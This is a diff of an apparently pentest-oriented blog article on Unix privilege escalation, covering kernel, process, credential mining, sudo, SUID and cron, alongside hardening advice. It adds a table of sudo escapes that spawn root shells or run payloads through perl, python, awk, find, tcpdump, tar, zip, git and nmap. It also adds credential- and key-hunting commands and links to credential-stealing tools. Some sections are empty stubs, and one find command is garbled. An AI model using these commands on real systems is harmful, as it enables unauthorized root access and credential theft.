@@ -17,21 +17,23 @@ keywords: ""
 - [Unix privilege escalation scopes](#unix-privilege-escalation-scopes)
     - [Kernel](#kernel)
         - [Kernel privilege escalation overview](#kernel-privilege-escalation-overview)
-        - [Good practices to avoid kernel privilege escalation](#good-practices-to-avoid-kernel-privilege-escalation)
         - [Kernel information gathering](#kernel-information-gathering)
     - [Process](#process)
         - [Process privilege escalation overview](#process-privilege-escalation-overview)
-        - [Good practices to avoid process privilege escalation](#good-practices-to-avoid-process-privilege-escalation)
         - [Process information gathering](#process-information-gathering)
     - [Mining credentials information](#mining-credentials-information)
         - [Mining sensitive information for gain a privilege escalation](#mining-sensitive-information-for-gain-a-privilege-escalation)
-        - [Good practices to prevent credentials leak](#good-practices-to-prevent-credentials-leak)
         - [Mining credentials commands](#mining-credentials-commands)
     - [Sudo](#sudo)
         - [Sudo overview](#sudo-overview)
-        - [Sudo good practices](#sudo-good-practices)
         - [Sudo information gathering](#sudo-information-gathering)
         - [Privilege escalation example using sudo](#privilege-escalation-example-using-sudo)
+    - [File permission](#file-permission)
+        - [File permission overview](#file-permission-overview)
+        - [File permission information gathering](#file-permission-information-gathering)
+    - [Cron](#cron)
+        - [Cron privilege escalation overview](#cron-privilege-escalation-overview)
+        - [Cron information gathering](#cron-information-gathering)
     - [Other useful information which can be gathered](#other-useful-information-which-can-be-gathered)
 
 
@@ -52,6 +54,8 @@ In all theses cases after he will gain access to the machine he will need to sec
 This article will try to give a complete overview of all unix privilege escalation technics.
 Do not hesitate to share with us your techniques in the comments.
 
+For helping you to gather information on a unix computer you can use this cool script [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which can be very useful.
+
 # Unix privilege escalation scopes
 
 This article separate the local unix privilege escalation in different scopes: kernel, deamon and process, password mining, sudo, cron and file permission. Foreach I will gave you  commands for information gasthering, I will explain how to gain an escalation privilege with the information you collect, and finnaly I will give you the remediation.
@@ -60,16 +64,13 @@ This article separate the local unix privilege escalation in different scopes: k
 
 ### Kernel privilege escalation overview
 
-Kernel privilege escalation are made with kernel exploit, and generally give super user access.
+Kernel privilege escalation are made with kernel exploit, and generally give the root access.
 
-### Good practices to avoid kernel privilege escalation
+There is no way to completely avoid a kernel privilege escalation. But some good practices are good to know. The first one is to always being aware about security reports and keeping your system up to date.
 
-There is no way to completely avoid a kernel privilege escalation. But some good practices are good to know. The first one is to always being aware about security vulnerabilities discovered and keeping your system up to date, patch it when a patch is realized.
+For a kernel privilege escalation the attacker will use a kernel exploit. For that he will need three conditions:
 
-For a kernel privilege escalation the attacker will use a kernel exploit. For that he will need four conditions:
-
-1. A vulnerable kernel
-1. A matching exploit
+1. A working exploit
 1. The ability to transfer the exploit onto the target
 1. The ability to execute the exploit on the target
 
@@ -79,7 +80,7 @@ For this reason you must influence the last two points. So a good practice will 
 
 It is also a good practice to remove or restrict the access of all the compilers such as gcc.
 
-An other good practice will be to limit directories that are writeable and
+An other good practice will be to limit directories that are writable and
 executable, particularly by service users.
 
 Finally, but it is most of the time hard to do because it has a cost, it is a really good practice to externalized logs in an other machine.
@@ -106,13 +107,11 @@ Some basic command to collect some clue for realized a unix kernel exploitation
 
 Most of the time an attacker succeed to establish the initial foothold by using a miss configured or vulnerable running service, but it does not stop there.
 
-An attacker can use a process which is only accessible from the local machine for doing privilege escalation. For example, using a vulnerable MySQL database which is running as root.
+An attacker can use a process which is only accessible locally for doing privilege escalation. For example, using a vulnerable MySQL database which is running as root.
 
-### Good practices to avoid process privilege escalation
+Most of the time the method attack will be similar than for a kernel privilege escalation. The attacker will use an exploit, and for that he will need the three conditions we see [upper](#kernel-privilege-escalation-overview). Also all the good practices site for the kernel can be transposed for the running processes.
 
-Most of the time the method attack will be similar than for a kernel privilege escalation. The attacker will use an exploit, and for that he will need the four conditions we see [upper](#good-practices-to-avoid-kernel-privilege-escalation). Also all the good practices site for the kernel can be transposed for the running processes.
-
-A good practice for all your sensitive services (a service which can be access from the outside is definitly sensitive) is to run them into a chroot jail, at least creating a specific user with no shell. Please do not run them as root, it is the worst that you can do.
+A good practice for all your sensitive services (a service which can be access from the outside is definitly sensitive) is to run them into a chroot jail, at least creating a specific user. Please do not run them as root, it is the worst that you can do.
 
 ### Process information gathering
 
@@ -138,8 +137,6 @@ Some basic command to collect some clue for realized a privilege escalation by p
 
 On a server (it is much more true for a personal computer) you can find many different sensitive information like login, password, private and public keys, certificates... Theses information can be find and used to access on an other machine, service or for realized a privilege escalation.
 
-### Good practices to prevent credentials leak
-
 To prevent this kind of leak you should take care of the privilege access of the sensitive directories, like `/home/<user>/.ssh` directory which can normally only be read and write by the user (`chmod 600`) or the `/etc/shadow` file which is normally in read write for the root user and in read for the root group (`chomd 640`).
 
 It is also really important to never put some credentials in any code or configuration file. If for any reason, you have to do it, be sure the password is not in clear and the script or config file have specific privilege that not let anyone to read it.
@@ -155,26 +152,100 @@ Here some few commands which can be useful for finding credentials on a unix sys
 | `grep -B3 -A3 -i 'pass\|password\|login\|username\|email\|mail\|host\|ip' /var/log/*.log 2>/dev/null` | Check log file in `/var/log` for password, login, or email information |
 | `find / -maxdepth 4 -name '*.conf' -type f -exec grep -Hn 'pass\|password\|login\|username\|email\|mail\|host\|ip' {} \; 2>/dev/null` | Find the configuration files which contain interesting information |
 
+### Tools
+
+Here few tools than can be usefull and help you in your job.
+
+- [Pupy](https://github.com/n1nj4sec/pupy/)
+- [LaZagne](https://github.com/AlessandroZ/LaZagne)
+- [gimmecredz](https://github.com/0xmitsurugi/gimmecredz)
+
 ## Sudo
 
 ### Sudo overview
 
-The `sudo` command give the possibility to a user to execute a command as another user (usually those of the root account).
-A well configured `sudo` permit to give some specifics privileges to a user without breaking the security.
+The `sudo` command give the possibility to a user to execute a command as another user (usually the root account).
+A miss configuration of the sudo command can easily lead to a privilege escalation. To prevent it, there is few good practices:
 
-### Sudo good practices
-
-A miss configuration of the sudo command can easily lead to a privilege escalation. To prevent it there is few good practices:
-
-The first one is to granted the minimum possible privileges to perform necessary tasks or operations, be the more specific than you can. For example if you want to allow a user to listen on a specific interface with `tcpdump`. You should configure `sudo` like that `user ALL= (root)   NOPASSWD: /usr/sbin/tcpdump -ttteni eth0`, this configuration will permit to `user` to execute this exact command `/usr/sbin/tcpdump -ttteni eth0` as root no other argument.
+Grant the minimum privileges to perform necessary tasks or operations, be the more specific than you can. For example if you want to allow a user to listen on a specific interface like `eth0` with `tcpdump`. You should configure `sudo` as it follow `user ALL= (root)   NOPASSWD: /usr/sbin/tcpdump -ttteni eth0`. This configuration will permit to `user` to execute this exact command `/usr/sbin/tcpdump -ttteni eth0` as root he will have to use this exacte options in the same order or it will note work.
 
 Never configure `sudo` like that `user	ALL=NOPASSWD:ALL`.
 
-And finally 
+Do not allow some commands that can permit to execute some code like `vi`, `find`, `bash`, `awk`, `perl` ...
 
 ### Sudo information gathering
 
+Here the command you need to get some clues about your the possibilities you have to realized a privilege escalation using `sudo`.
+
+| Command                | Result                            |
+| :-------------------- | :------------------------------- |
+| `sudo -l` or `sudo -lll` | List the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host |
+| `sudo -V` | Sudo version |
+
 ### Privilege escalation example using sudo
+
+Here some example of command you can use for escalade your privileges.
+
+\* I have found most of those commands on the blog [Le journal d'un reverser](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
+
+| Command                | Explaination                            |
+| :-------------------- | :------------------------------- |
+| `sudo su` | Become root |
+| `perl -e 'exec "/bin/bash";'` | Launch a bash as root |
+| `python -c 'import pty;pty.spawn("/bin/bash")'` | Launch a bash as root |
+| When you execute one of theses program `less`, `more`, `nano`, `vi`, the `man`, `ftp`, `mysql`, `psql` you can execute some code into like that `!bash` | Launch a bash as root |
+| `awk 'BEGIN {system("/bin/bash")}'` | Launch a bash as root |
+| `find /home -exec /bin/bash \;` | Launch a bash as root |
+| `tcpdump -n -i lo -G1 -w /dev/null -z ./payload.sh` | Execute the program payload.sh as root |
+| `tar c a.tar -I ./payload.sh a` | Execute the program payload.sh as root |
+| `zip z.zip a -T -TT ./payload.sh` | Execute the program payload.sh as root |
+| `man -P /tmp/payload.sh man` | Execute the program payload.sh as root |
+| `export PAGER=./payload.sh` `git -p help`| Execute the program payload.sh as root |
+| `export PATH=/tmp:$PATH` `ln -sf /tmp/payload.sh /tmp/git-help` `git --exec-path=/tmp help` | Execute the program payload.sh as root |
+| `ls -la .bashrc` `export HOME=.` `bash` | Launch a bash as root |
+| `nmap --interactive` `!bash` | Launch a bash as root |
+
+## File permission
+
+- SUID SGID
+
+### File permission overview
+
+### File permission information gathering
+
+| Command                | Result                            |
+| :-------------------- | :------------------------------- |
+| `find / -perm -4000 -type f 2>/dev/null` | Find SUID files |
+| `find / -uid 0 -perm -4000 -type f 2>/dev/null` | Find SUID files owned by root |
+| `find / -perm -2000 -type f 2>/dev/null` | Find SGID files (sticky bit) |
+| `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null` | Find world-writeable files excluding `proc` file |
+| `find / -type f '(' -name *.cert -or -name *.crt -or -name *.pem -or -name *.ca -or -name *.p12 -or -name *.cer -name *.der ')' '(' '(' -user support -perm -u=r ')' -or '(' -group support -perm -g=r ')' -or '(' -perm -o=r ')' ')' 2> /dev/null-or -name *.cer -name *.der ')' 2> /dev/null` | Find keys or certificates you can read |
+| `find /home –name *.rhosts -print 2>/dev/null` | Find rhost config files |
+| `find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;` | Find hosts.equiv, list permissions and cat the file contents |
+| `cat ~/.bash_history` | Display current user history |
+| `ls -la ~/.*_history` | Dislay the current user various history files |
+| `ls -la ~/.ssh/` | Check current user's ssh files |
+| `find /etc -maxdepth 1 -name '*.conf' -type f` or `ls -la /etc/*.conf` | List the configuration files in /etc (depth 1, modify the maxdepth param in the first command for change it) |
+| `lsof | grep '/home/\|/etc/\|/opt/'` | Display the possibly interesting openfiles |
+
+## Cron
+
+- Path
+- Wildcard
+- File Overwrite
+
+Have a look on this article [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+
+### Cron privilege escalation overview
+
+### Cron information gathering
+
+Some basic command to collect some clue for realized a privilege escalation using a misconfigured cron.
+
+| Command                | Result                            |
+| :-------------------- | :------------------------------- |
+| `crontab -l` | Display cron of the current user |
+| `ls -la /etc/cron*` | Display scheduled jobs overview |
 
 ## Other useful information which can be gathered
 
@@ -194,6 +265,7 @@ Those commands are really useful to collect some clue for realized a privilege e
 | `users` or `who -a` | Print the user names of users currently logged in to the current host |
 | `cat /etc/shells` | Pathnames of valid login shells |
 | `cat /etc/profile` | Display default system variables |
+| `cat ~/.profile` | Display user variables and functions |
 | `env` | Display environmental variables |
 | `route` | Display route information |
 | `arp -a` | Display arp table |
